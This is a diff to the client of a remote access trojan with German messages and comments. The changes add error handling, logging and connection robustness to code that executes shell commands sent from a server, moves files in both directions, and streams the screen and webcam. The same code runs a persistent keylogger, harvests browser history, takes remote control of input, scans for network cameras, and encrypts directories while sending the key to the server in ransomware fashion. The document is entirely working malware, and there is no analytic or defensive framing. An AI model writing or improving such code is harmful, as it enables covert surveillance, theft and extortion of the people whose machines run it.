@@ -237,12 +237,15 @@ def decrypt_directory(path, key_hex):
     return decrypted_files
 
 async def send_encryption_key(websocket, key, path):
-    msg = {
-        "type": "encryption_key",
-        "key_hex": key.hex(),
-        "path": path
-    }
-    await websocket.send(json.dumps(msg))
+    try:
+        msg = {
+            "type": "encryption_key",
+            "key_hex": key.hex(),
+            "path": path
+        }
+        await websocket.send(json.dumps(msg))
+    except Exception as e:
+        logging.error(f"Fehler beim Senden des Verschlüsselungsschlüssels: {e}")
 
 # === Keylogger ===
 def on_press_persistent(key):
@@ -436,7 +439,11 @@ def get_browser_history(limit=50):
 
 # === Fernsteuerung via pyautogui ===
 def handle_pyautogui_control(cmd: dict):
-    import pyautogui
+    try:
+        import pyautogui
+    except ImportError:
+        return {"status": "error", "error": "pyautogui ist nicht installiert"}
+    
     action = cmd.get("control_action")
     try:
         if action == "move":
@@ -483,9 +490,9 @@ class ScreenStreamer:
 
     async def start(self, ws):
         if self._running:
-            print("[ScreenStreamer] Bereits aktiv.")
+            logging.info("[ScreenStreamer] Bereits aktiv.")
             return
-        print("[ScreenStreamer] Starte Streaming.")
+        logging.info("[ScreenStreamer] Starte Streaming.")
         self._running = True
         self._ws = ws
         self._task = asyncio.create_task(self._stream())
@@ -497,11 +504,11 @@ class ScreenStreamer:
             try:
                 await self._task
             except asyncio.CancelledError:
-                print("[ScreenStreamer] Task abgebrochen.")
+                logging.info("[ScreenStreamer] Task abgebrochen.")
             except Exception as e:
-                print(f"[ScreenStreamer] Fehler beim Stoppen: {e}")
+                logging.error(f"[ScreenStreamer] Fehler beim Stoppen: {e}")
             self._task = None
-        print("[ScreenStreamer] Gestoppt.")
+        logging.info("[ScreenStreamer] Gestoppt.")
 
     async def _stream(self):
         sct = mss.mss()
@@ -525,13 +532,13 @@ class ScreenStreamer:
                     await self._ws.send(json.dumps(meta))
                     await self._ws.send(img_bytes)
                 except Exception as e:
-                    print(f"[ScreenStreamer] Fehler beim Senden: {e}")
+                    logging.error(f"[ScreenStreamer] Fehler beim Senden: {e}")
                     break
                 await asyncio.sleep(1 / self._fps)
         except asyncio.CancelledError:
-            print("[ScreenStreamer] Stream-Task abgebrochen.")
+            logging.info("[ScreenStreamer] Stream-Task abgebrochen.")
         except Exception as e:
-            print(f"[ScreenStreamer] Fehler: {e}")
+            logging.error(f"[ScreenStreamer] Fehler: {e}")
 
 screen_streamer = ScreenStreamer()
 
@@ -612,12 +619,19 @@ def shutdown_or_restart(action):
 
 # --- Heartbeat/Ping ---
 async def heartbeat(ws, interval=60):
-    while True:
-        try:
-            await ws.send(json.dumps({"type": "ping"}))
-        except Exception:
-            break
-        await asyncio.sleep(interval)
+    try:
+        while True:
+            try:
+                await ws.send(json.dumps({"type": "ping"}))
+                await asyncio.sleep(interval)
+            except websockets.ConnectionClosed:
+                logging.info("Heartbeat: Verbindung geschlossen")
+                break
+            except Exception as e:
+                logging.error(f"Heartbeat Fehler: {e}")
+                break
+    except asyncio.CancelledError:
+        logging.info("Heartbeat Task abgebrochen")
 
 # === Hauptlogik: Kommandos ===
 async def process_commands(websocket):
@@ -627,178 +641,190 @@ async def process_commands(websocket):
         except Exception:
             pass
 
-    while True:
-        try:
-            message = await websocket.recv()
-            if isinstance(message, bytes):
-                continue
-            command = json.loads(message)
-            action = command.get("action")
-            response = {"status": "ok"}
-
-            if action == "screenstream_start":
-                print("[Client] Screenstream Start angefordert.")
-                await screen_streamer.start(websocket)
-                await send_status("Screenstream gestartet.")
-                response["type"] = "command_output"
-                response["output"] = "Screen-Streaming gestartet."
-                await websocket.send(json.dumps(response))
-                continue
-            elif action == "screenstream_stop":
-                print("[Client] Screenstream Stop angefordert.")
-                await screen_streamer.stop()
-                await send_status("Screenstream gestoppt.")
-                response["type"] = "command_output"
-                response["output"] = "Screen-Streaming gestoppt."
-                await websocket.send(json.dumps(response))
-                continue
-            elif action == "webcam_start":
-                await webcam_streamer.start(websocket)
-                await send_status("Webcam-Streaming gestartet.")
-                response["type"] = "command_output"
-                response["output"] = "Webcam-Streaming gestartet."
-                await websocket.send(json.dumps(response))
-                continue
-            elif action == "webcam_stop":
-                await webcam_streamer.stop()
-                await send_status("Webcam-Streaming gestoppt.")
-                response["type"] = "command_output"
-                response["output"] = "Webcam-Streaming gestoppt."
-                await websocket.send(json.dumps(response))
-                continue
-            elif action == "control":
-                ctrl_result = handle_pyautogui_control(command)
-                response.update(ctrl_result)
-                response["type"] = "command_output"
-                await websocket.send(json.dumps(response))
-                continue
-
-            if action == "exec":
-                cmd_to_run = command.get("command")
-                result = subprocess.run(
-                    cmd_to_run,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    encoding="utf-8",
-                    errors="ignore",
-                )
-                response["type"] = "command_output"
-                response["output"] = result.stdout + result.stderr
-
-            elif action == "screenshot":
-                try:
-                    with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
-                        tmp_path = tmpfile.name
-                    with mss.mss() as sct:
-                        sct.shot(output=tmp_path)
-                        with open(tmp_path, "rb") as img_file:
-                            encoded_string = base64.b64encode(
-                                img_file.read()
-                            ).decode("utf-8")
-                    os.remove(tmp_path)
-                    response["type"] = "screenshot"
-                    response["data"] = encoded_string
-                except Exception as e:
-                    response["status"] = "error"
-                    response["type"] = "command_output"
-                    response["output"] = f"Fehler beim Screenshot: {e}"
-
-            elif action == "download":
-                path = command.get("path")
-                if os.path.exists(path) and os.path.isfile(path):
-                    with open(path, "rb") as f:
-                        file_data = base64.b64encode(f.read()).decode("utf-8")
-                    response["type"] = "file_download"
-                    response["filename"] = os.path.basename(path)
-                    response["data"] = file_data
-                else:
-                    response["status"] = "error"
-                    response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
-
-            elif action == "upload":
-                filename = command.get("filename")
-                data_b64 = command.get("data")
-                response["type"] = "command_output"
-                response["output"] = save_uploaded_file(filename, data_b64)
-
-            elif action == "ls":
-                path = command.get("path", ".")
-                response["type"] = "command_output"
-                response["output"] = list_directory(path)
-
-            elif action == "systeminfo":
-                response["type"] = "command_output"
-                response["output"] = get_system_info()
-
-            elif action in ("shutdown", "restart"):
-                response["type"] = "command_output"
-                response["output"] = shutdown_or_restart(action)
-
-            elif action == "history":
-                limit = command.get("limit", 50)
-                response["type"] = "command_output"
-                response["output"] = get_browser_history(limit)
-
-            elif action == "keylogger":
-                if not keyboard:
-                    response["status"] = "error"
-                    response["error"] = "pynput ist auf dem Client nicht installiert."
-                elif not os.path.exists(KEYLOG_FILE_PATH):
-                    response["type"] = "command_output"
-                    response["output"] = "Keylog-Datei existiert noch nicht."
-                else:
-                    count = command.get("count", 1000)
-                    with open(KEYLOG_FILE_PATH, "rb") as f:
-                        f.seek(0, os.SEEK_END)
-                        filesize = f.tell()
-                        seek_pos = max(0, filesize - int(count * 1.5))
-                        f.seek(seek_pos)
-                        last_chunk = f.read().decode("utf-8", errors="ignore")
-                        output = last_chunk[-count:]
-                    response["type"] = "command_output"
-                    response["output"] = (
-                        f"Die letzten {len(output)} Zeichen aus der Log-Datei "
-                        f"({filesize / 1024:.2f} KB):\n{output}"
-                    )
-            elif action == "cd":
-                path = command.get("path", ".")
-                response["type"] = "command_output"
-                response["output"] = change_directory(path)
-            elif action == "encrypt":
-                path = command.get("path", ".")
-                response["type"] = "command_output"
-                try:
-                    key, files = encrypt_directory(path)
-                    await send_encryption_key(websocket, key, path)
-                    response["output"] = f"Verschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}.\nSchlüssel wurde an den Server gesendet."
-                except Exception as e:
-                    response["output"] = f"Fehler bei Verschlüsselung: {e}"
-            elif action == "decrypt":
-                path = command.get("path", ".")
-                key_hex = command.get("key_hex")
-                response["type"] = "command_output"
-                try:
-                    files = decrypt_directory(path, key_hex)
-                    response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
-                except Exception as e:
-                    response["output"] = f"Fehler bei Entschlüsselung: {e}"
-            elif action == "scan_cameras":
-                cams = scan_network_cameras()
-                response["type"] = "command_output"
-                response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
-            else:
-                response["status"] = "error"
-                response["error"] = "Unbekannte Aktion"
-
-            await websocket.send(json.dumps(response))
-        except Exception as e:
-            print(f"[Client] Fehler im Command-Handler: {e}")
-            error_response = {"status": "error", "error": f"Client-Fehler: {e}"}
+    try:
+        while True:
             try:
-                await websocket.send(json.dumps(error_response))
-            except Exception as e2:
-                print(f"[Client] Fehler beim Senden des Fehler-Responses: {e2}")
+                message = await asyncio.wait_for(websocket.recv(), timeout=180)
+                if isinstance(message, bytes):
+                    continue
+                    
+                command = json.loads(message)
+                action = command.get("action")
+                response = {"status": "ok"}
+
+                if action == "screenstream_start":
+                    logging.info("[Client] Screenstream Start angefordert.")
+                    await screen_streamer.start(websocket)
+                    await send_status("Screenstream gestartet.")
+                    response["type"] = "command_output"
+                    response["output"] = "Screen-Streaming gestartet."
+                    await websocket.send(json.dumps(response))
+                    continue
+                elif action == "screenstream_stop":
+                    logging.info("[Client] Screenstream Stop angefordert.")
+                    await screen_streamer.stop()
+                    await send_status("Screenstream gestoppt.")
+                    response["type"] = "command_output"
+                    response["output"] = "Screen-Streaming gestoppt."
+                    await websocket.send(json.dumps(response))
+                    continue
+                elif action == "webcam_start":
+                    await webcam_streamer.start(websocket)
+                    await send_status("Webcam-Streaming gestartet.")
+                    response["type"] = "command_output"
+                    response["output"] = "Webcam-Streaming gestartet."
+                    await websocket.send(json.dumps(response))
+                    continue
+                elif action == "webcam_stop":
+                    await webcam_streamer.stop()
+                    await send_status("Webcam-Streaming gestoppt.")
+                    response["type"] = "command_output"
+                    response["output"] = "Webcam-Streaming gestoppt."
+                    await websocket.send(json.dumps(response))
+                    continue
+                elif action == "control":
+                    ctrl_result = handle_pyautogui_control(command)
+                    response.update(ctrl_result)
+                    response["type"] = "command_output"
+                    await websocket.send(json.dumps(response))
+                    continue
+
+                if action == "exec":
+                    cmd_to_run = command.get("command")
+                    result = subprocess.run(
+                        cmd_to_run,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        encoding="utf-8",
+                        errors="ignore",
+                    )
+                    response["type"] = "command_output"
+                    response["output"] = result.stdout + result.stderr
+
+                elif action == "screenshot":
+                    try:
+                        with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmpfile:
+                            tmp_path = tmpfile.name
+                        with mss.mss() as sct:
+                            sct.shot(output=tmp_path)
+                            with open(tmp_path, "rb") as img_file:
+                                encoded_string = base64.b64encode(
+                                    img_file.read()
+                                ).decode("utf-8")
+                        os.remove(tmp_path)
+                        response["type"] = "screenshot"
+                        response["data"] = encoded_string
+                    except Exception as e:
+                        response["status"] = "error"
+                        response["type"] = "command_output"
+                        response["output"] = f"Fehler beim Screenshot: {e}"
+
+                elif action == "download":
+                    path = command.get("path")
+                    if os.path.exists(path) and os.path.isfile(path):
+                        with open(path, "rb") as f:
+                            file_data = base64.b64encode(f.read()).decode("utf-8")
+                        response["type"] = "file_download"
+                        response["filename"] = os.path.basename(path)
+                        response["data"] = file_data
+                    else:
+                        response["status"] = "error"
+                        response["error"] = "Datei nicht gefunden oder ist ein Verzeichnis."
+
+                elif action == "upload":
+                    filename = command.get("filename")
+                    data_b64 = command.get("data")
+                    response["type"] = "command_output"
+                    response["output"] = save_uploaded_file(filename, data_b64)
+
+                elif action == "ls":
+                    path = command.get("path", ".")
+                    response["type"] = "command_output"
+                    response["output"] = list_directory(path)
+
+                elif action == "systeminfo":
+                    response["type"] = "command_output"
+                    response["output"] = get_system_info()
+
+                elif action in ("shutdown", "restart"):
+                    response["type"] = "command_output"
+                    response["output"] = shutdown_or_restart(action)
+
+                elif action == "history":
+                    limit = command.get("limit", 50)
+                    response["type"] = "command_output"
+                    response["output"] = get_browser_history(limit)
+
+                elif action == "keylogger":
+                    if not keyboard:
+                        response["status"] = "error"
+                        response["error"] = "pynput ist auf dem Client nicht installiert."
+                    elif not os.path.exists(KEYLOG_FILE_PATH):
+                        response["type"] = "command_output"
+                        response["output"] = "Keylog-Datei existiert noch nicht."
+                    else:
+                        count = command.get("count", 1000)
+                        with open(KEYLOG_FILE_PATH, "rb") as f:
+                            f.seek(0, os.SEEK_END)
+                            filesize = f.tell()
+                            seek_pos = max(0, filesize - int(count * 1.5))
+                            f.seek(seek_pos)
+                            last_chunk = f.read().decode("utf-8", errors="ignore")
+                            output = last_chunk[-count:]
+                        response["type"] = "command_output"
+                        response["output"] = (
+                            f"Die letzten {len(output)} Zeichen aus der Log-Datei "
+                            f"({filesize / 1024:.2f} KB):\n{output}"
+                        )
+                elif action == "cd":
+                    path = command.get("path", ".")
+                    response["type"] = "command_output"
+                    response["output"] = change_directory(path)
+                elif action == "encrypt":
+                    path = command.get("path", ".")
+                    response["type"] = "command_output"
+                    try:
+                        key, files = encrypt_directory(path)
+                        await send_encryption_key(websocket, key, path)
+                        response["output"] = f"Verschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}.\nSchlüssel wurde an den Server gesendet."
+                    except Exception as e:
+                        response["output"] = f"Fehler bei Verschlüsselung: {e}"
+                elif action == "decrypt":
+                    path = command.get("path", ".")
+                    key_hex = command.get("key_hex")
+                    response["type"] = "command_output"
+                    try:
+                        files = decrypt_directory(path, key_hex)
+                        response["output"] = f"Entschlüsselung abgeschlossen für {len(files)} Dateien im Verzeichnis {path}."
+                    except Exception as e:
+                        response["output"] = f"Fehler bei Entschlüsselung: {e}"
+                elif action == "scan_cameras":
+                    cams = scan_network_cameras()
+                    response["type"] = "command_output"
+                    response["output"] = "Gefundene Netzwerk-Kameras:\n" + ("\n".join(cams) if cams else "Keine gefunden.")
+                else:
+                    response["status"] = "error"
+                    response["error"] = "Unbekannte Aktion"
+
+                await websocket.send(json.dumps(response))
+                
+            except asyncio.TimeoutError:
+                logging.warning("Client timeout, sende ping")
+                try:
+                    await websocket.send(json.dumps({"type": "ping"}))
+                except Exception:
+                    break
+                continue
+            except websockets.ConnectionClosed:
+                logging.info("WebSocket Verbindung geschlossen")
+                break
+            except Exception as e:
+                logging.error(f"Fehler im Command-Handler: {e}")
+                break
+                
+    except Exception as e:
+        logging.error(f"Unerwarteter Fehler in process_commands: {e}")
 
 # --- Haupt-Entry-Point ---
 async def connect_to_server():
@@ -807,12 +833,19 @@ async def connect_to_server():
     start_persistent_keylogger()
     send_ntfy_notification()
     backoff = 5
+    
     while True:
         try:
-            async with websockets.connect(SERVER_URI) as websocket:
+            async with websockets.connect(
+                SERVER_URI,
+                ping_interval=30,
+                ping_timeout=10,
+                close_timeout=10
+            ) as websocket:
                 logging.info("[+] Verbunden mit dem Server.")
+                
                 try:
-                    msg = await websocket.recv()
+                    msg = await asyncio.wait_for(websocket.recv(), timeout=10)
                     if isinstance(msg, bytes):
                         msg = msg.decode("utf-8", errors="ignore")
                     data = json.loads(msg)
@@ -827,9 +860,21 @@ async def connect_to_server():
                         }))
                 except Exception as e:
                     logging.warning(f"Fehler beim Senden von Systeminfos: {e}")
-                asyncio.create_task(heartbeat(websocket, 60))
-                await process_commands(websocket)
+                
+                # Heartbeat in separatem Task
+                heartbeat_task = asyncio.create_task(heartbeat(websocket, 60))
+                
+                try:
+                    await process_commands(websocket)
+                finally:
+                    heartbeat_task.cancel()
+                    try:
+                        await heartbeat_task
+                    except asyncio.CancelledError:
+                        pass
+                        
                 backoff = 5
+                
         except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
             logging.warning(f"Verbindung verloren: {e}")
             await asyncio.sleep(backoff)
